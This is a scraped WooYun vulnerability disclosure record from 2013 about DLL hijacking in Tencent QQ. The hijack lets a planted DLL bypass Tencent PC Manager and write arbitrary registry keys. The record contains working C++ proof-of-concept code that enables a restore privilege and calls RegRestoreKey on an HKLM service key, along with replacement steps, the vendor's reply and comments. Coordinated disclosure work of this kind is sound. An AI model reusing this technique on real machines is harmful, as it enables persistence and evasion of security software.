{"id": 7314, "wybug_id": "wooyun-2013-037778", "wybug_title": "绕过腾讯电脑安全管家任意写注册表（POC）", "wybug_corp": "腾讯", "wybug_author": "n0bele", "wybug_date": "2013-09-22 17:27", "wybug_open_date": "2013-12-21 17:28", "wybug_type": "非授权访问/认证绕过", "wybug_level": "低", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-21：\t细节向公众公开  简要描述： 腾讯觉得当前目录下dll hijack没啥用，那我来测试下看看 详细说明：  几乎所有腾讯出品的软件都可以dll hijack,为了说明其影响我选用了安装量最多的QQ来劫持。按照他们得话讲这叫没校验:)上次腾讯的人说任意加载驱动POC无效，他们已经防dll注射了，那么dll hijack你们没防效果也是一样的。代码还是一样的代码。1.首先我选个dll来劫持，就C:\\Program Files\\Tencent\\QQ\\Bin\\OPWebKitClient.dll吧，这个dll在登陆QQ后点击系统设置触发.2.拷贝一份原OPWebKitClient.dll导出表到我的hijack.dll,我的hijack代码如下:\nBOOL EnableDebugPriv(LPCTSTR lpName){\tBOOL bRet = FALSE;\tHANDLE hToken = NULL;\tTOKEN_PRIVILEGES tp;\tLUID luid;\tdo\t{\t\tif(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))\t\t\tbreak;\t\tif(!LookupPrivilegeValue(NULL,lpName,&luid))\t\t\tbreak;\t\ttp.PrivilegeCount = 1;\t\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\t\ttp.Privileges[0].Luid = luid;\t\tbRet = AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL);\t}\twhile(FALSE);\t\tif(hToken != NULL)\t\tCloseHandle(hToken);\treturn bRet;}BOOL RestoreReg(HKEY hKey,LPCTSTR lpSubKey,TCHAR szFilePath[MAX_PATH]){\tBOOL bRet = FALSE;\tHKEY hCur = NULL;\tdo\t{\t\tif(!EnableDebugPriv(SE_RESTORE_NAME))\t\t\tbreak;\t\tif(RegOpenKeyEx(hKey,lpSubKey,NULL,KEY_ALL_ACCESS,&hCur) != ERROR_SUCCESS &&\t\t\tRegCreateKey(hKey,lpSubKey,&hCur) != ERROR_SUCCESS)\t\t\tbreak;\t\tif(RegRestoreKey(hCur,szFilePath,REG_FORCE_RESTORE) != ERROR_SUCCESS)\t\t\tbRet = TRUE;\t}\twhile(FALSE);\tif(hCur)\t\tRegCloseKey(hCur);\treturn bRet;}BOOL CDllHijackApp::InitInstance(){\tCWinApp::InitInstance();\tRestoreReg(HKEY_LOCAL_MACHINE,L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\poc\",L\"C:\\\\poc.hiv\");\treturn TRUE;}\n将我的hijack.dll命名为OPWebKitClient.dll,覆盖到C:\\Program Files\\Tencent\\QQ\\Bin\\   漏洞证明：  \n\n成功写入注册表   修复方案：  他们更懂   版权声明：转载请注明来源 n0bele@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2013-09-24 14:31 厂商回复： 感谢反馈，问题已确认，目前已在处理中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-22 17:38 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  我靠 lz碉堡了    \n     2013-09-23 09:13 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  大牛球带    \n     2013-09-23 17:10 |    \t\tp0di \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 1+1 = 2 ？)\t\t \n  @duking  快递到了，领洞。    \n     2013-09-24 15:51 |    \t\tn0bele \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:45        | 无耻最寂寞)\t\t \n  3rank 说明是小bug了，逮个腾讯的程序就全面过安全管家的主动防御，那还不如不防这样还节省点电脑资源。    \n     2013-10-14 15:43 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  悲剧    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}